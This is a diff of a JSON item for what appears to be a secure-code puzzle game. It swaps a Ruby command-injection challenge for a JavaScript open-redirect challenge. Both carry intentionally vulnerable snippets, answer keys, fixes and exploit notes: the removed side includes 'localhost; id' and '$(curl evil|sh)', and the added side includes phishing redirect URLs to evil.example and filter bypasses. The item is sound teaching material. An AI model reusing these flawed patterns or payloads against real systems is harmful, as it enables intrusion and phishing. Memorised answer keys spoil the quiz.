@@ -1,53 +1,52 @@
 {
-  "id": "srd-0016",
+  "id": "srd-0019",
   "date": "2026-10-15",
   "difficulty": "easy",
-  "language": "ruby",
+  "language": "javascript",
   "estimatedMinutes": 5,
   "snippet": {
     "files": [
       {
-        "name": "ping.rb",
-        "code": "require \"sinatra\"\n\nget \"/ping\" do\n  host = params[\"host\"]\n  # Ping the host and show the output.\n  output = `ping -c 1 #{host}`\n  \"<pre>#{output}</pre>\"\nend",
+        "name": "redirect.js",
+        "code": "const express = require(\"express\");\nconst app = express();\n\n// After login, send the user back where they came from.\napp.get(\"/go\", (req, res) => {\n  const next = req.query.next;\n  res.redirect(next);\n});\n\napp.listen(3000);",
         "notes": {
-          "3": "Defines the GET /ping route.",
-          "4": "Reads the `host` query parameter — attacker-controlled.",
-          "6": "Backticks run a shell command; `#{host}` is interpolated into the command string.",
-          "7": "Returns the command output wrapped in a <pre> block."
+          "5": "Route that bounces the user onward after login.",
+          "6": "Reads the `next` query parameter — attacker-controlled.",
+          "7": "Issues an HTTP redirect to whatever `next` contains."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "ping.rb",
-      "line": 6,
+      "file": "redirect.js",
+      "line": 7,
       "yellowRadius": 1,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "command-inj",
+      "answer": "open-redirect",
       "options": [
-        "command-inj",
-        "code-inj",
-        "sqli",
+        "open-redirect",
         "ssrf",
-        "open-redirect"
+        "path-traversal",
+        "code-inj",
+        "idor"
       ]
     },
     "why": {
-      "answerIndex": 2,
+      "answerIndex": 1,
       "options": [
         {
-          "label": "`params` can be nil, raising an error",
-          "whyWrong": "A nil check is robustness, not the vulnerability."
+          "label": "A 302 redirect isn't cached, so the client makes an extra request",
+          "whyWrong": "Caching behavior is irrelevant to the security issue."
         },
         {
-          "label": "The output is echoed into HTML, which is the main risk",
-          "whyWrong": "That is a real secondary issue (XSS), but the primary flaw is that the input reaches a shell as a command."
+          "label": "`next` is attacker-controlled and used directly as the redirect target, so a link to this trusted site can bounce victims to an attacker's site (phishing)"
         },
         {
-          "label": "Backticks execute a shell, and `#{host}` is interpolated into it, so shell metacharacters run as commands"
+          "label": "`req.query.next` may be an array, causing a type error",
+          "whyWrong": "A type edge case is a robustness nit, not the redirect abuse."
         }
       ]
     },
@@ -55,23 +54,23 @@
       "answerIndex": 1,
       "options": [
         {
-          "label": "Remove ';' from host",
-          "diff": "+  host = host.delete(\";\")\n   output = `ping -c 1 #{host}`",
-          "whyWrong": "Other separators (`|`, `&&`, `$()`, backticks, newlines) still work."
+          "label": "Block values starting with 'http://' or 'https://'",
+          "diff": "+  if (/^https?:\\/\\//i.test(next)) return res.sendStatus(400);\n   res.redirect(next);",
+          "whyWrong": "Protocol-relative `//evil.com` and backslash tricks like `/\\evil.com` bypass this and still redirect off-site."
         },
         {
-          "label": "Run ping via an argument array without a shell",
-          "diff": "-  output = `ping -c 1 #{host}`\n+  require \"open3\"\n+  output, _ = Open3.capture2(\"ping\", \"-c\", \"1\", host)"
+          "label": "Allow only a site-relative path (a single leading slash, not '//')",
+          "diff": "-  res.redirect(next);\n+  if (!/^\\/[^/\\\\]/.test(next)) return res.sendStatus(400);\n+  res.redirect(next);"
         },
         {
-          "label": "Wrap host in double quotes inside the command",
-          "diff": "-  output = `ping -c 1 #{host}`\n+  output = `ping -c 1 \"#{host}\"`",
-          "whyWrong": "`$()` and backticks are still interpreted inside double quotes."
+          "label": "encodeURIComponent(next) before redirecting",
+          "diff": "-  res.redirect(next);\n+  res.redirect(encodeURIComponent(next));",
+          "whyWrong": "That corrupts a legitimate path and still can't confirm the destination is your site."
         },
         {
-          "label": "HTML-escape the output before display",
-          "diff": "-  \"<pre>#{output}</pre>\"\n+  \"<pre>#{Rack::Utils.escape_html(output)}</pre>\"",
-          "whyWrong": "That mitigates the separate XSS, not the command execution on line 6."
+          "label": "Check that next contains your domain name",
+          "diff": "+  if (!next.includes(\"mysite.com\")) return res.sendStatus(400);",
+          "whyWrong": "`https://evil.com/?x=mysite.com` contains it; substring checks are trivially bypassed."
         }
       ]
     }
@@ -82,28 +81,24 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Request `?host=localhost%3B id` (i.e. `localhost; id`). The shell runs `ping -c 1 localhost`, then `id`. `$(curl evil|sh)` and backticks work too.",
+    "exploit": "Send a victim `https://trusted-site/go?next=https://evil.example/login` — a link on the real domain that silently lands them on a look-alike login page to harvest credentials. `next=//evil.example` works too via protocol-relative URLs.",
     "concepts": [
-      "CWE-78",
-      "OWASP A03:2021"
+      "CWE-601",
+      "OWASP A01:2021"
     ],
     "hints": {
-      "line": "Which construct hands a built-up string to a shell?",
-      "bugClass": "The input reaches the operating system shell.",
-      "why": "What does the shell do with `;` in the command?",
-      "fix": "Execute with an argument array, no shell."
+      "line": "Where does user input become the place the browser is sent?",
+      "bugClass": "The destination of a redirect is user-chosen.",
+      "why": "Who benefits from a link on your domain that lands elsewhere?",
+      "fix": "Permit only destinations within your own site."
     }
   },
   "writeup": {
-    "summary": "Backticks in Ruby run the string through a shell, and `#{host}` interpolates attacker input directly into that command. A `host` of `localhost; id` runs an extra command. Executing via an argument array (`Open3.capture2(\"ping\", \"-c\", \"1\", host)`) passes `host` as a single argument with no shell to interpret metacharacters. (Line 7 also echoes output into HTML — a separate XSS worth fixing too.)",
+    "summary": "`res.redirect(next)` sends the browser wherever `next` says. Because the link lives on the trusted domain, attackers use it in phishing: victims trust the first URL and get bounced to a credential-stealing clone. Safe handling allows only site-relative paths (a single leading `/`, not `//`), or an explicit allowlist of destinations. Blocklisting `http://` misses protocol-relative and backslash forms.",
     "readNext": [
       {
-        "label": "Ruby Open3 docs",
-        "url": "https://docs.ruby-lang.org/en/master/Open3.html"
-      },
-      {
-        "label": "OWASP Command Injection",
-        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+        "label": "OWASP Unvalidated Redirects and Forwards",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
       }
     ]
   }
